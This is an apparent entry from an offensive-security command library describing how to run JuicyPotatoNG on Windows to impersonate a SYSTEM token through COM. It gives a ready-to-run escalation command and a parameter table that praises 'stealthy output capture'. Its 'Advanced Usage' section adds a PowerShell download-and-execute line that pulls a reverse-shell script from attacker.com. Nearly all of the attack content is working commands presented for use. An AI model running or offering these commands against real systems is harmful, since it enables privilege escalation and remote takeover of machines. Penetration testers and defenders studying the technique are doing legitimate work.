---
id: 20dab716-9d60-4cdc-86cc-29af2db2a34e
name: juicy-potato-ng-execute-command-as-system
type: command
executor: cmd
data: >-
  JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" >
  C:\juicypotatong.txt
output: null
created_at: '2023-04-06T03:56:30.268882+00:00'
updated_at: '2023-04-10T20:37:34.799796+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - token-manipulation
verified: true
validated: true
---

# juicy-potato-ng-execute-command-as-system

## Command

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```

## Description

This command invokes JuicyPotatoNG to escalate privileges by impersonating a SYSTEM token via COM hijacking, executing a whoami command in an elevated cmd.exe shell and redirecting output to a file for verification. Use this during local privilege escalation on vulnerable Windows systems to confirm SYSTEM access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-t *` | Target all available tokens for impersonation (wildcard for compatibility) | Yes |
| `-p "C:\Windows\System32\cmd.exe"` | Path to the executable to run with elevated privileges (cmd.exe for shell access) | Yes |
| `-a "/c whoami"` | Arguments passed to the executable (/c executes whoami and closes) | Yes |
| `> C:\juicypotatong.txt` | Redirects stdout to a file for stealthy output capture | No |

## Examples

### Basic Usage

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
```

### Advanced Usage

To execute a different command, such as opening a reverse shell:

```cmd
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\" > C:\output.txt
```

## Expected Output

Upon success, the file C:\juicypotatong.txt will contain:

```
nt authority\system
```

If unsuccessful (e.g., patched system), it may show the original user like 'domain\user' or an error message such as '[-] No token with SeImpersonatePrivilege found'.

## Related

- [[procedures/Windows-JuicyPotatoNG-Privilege-Escalation]]
- [[tools/juicy-potato-ng]]
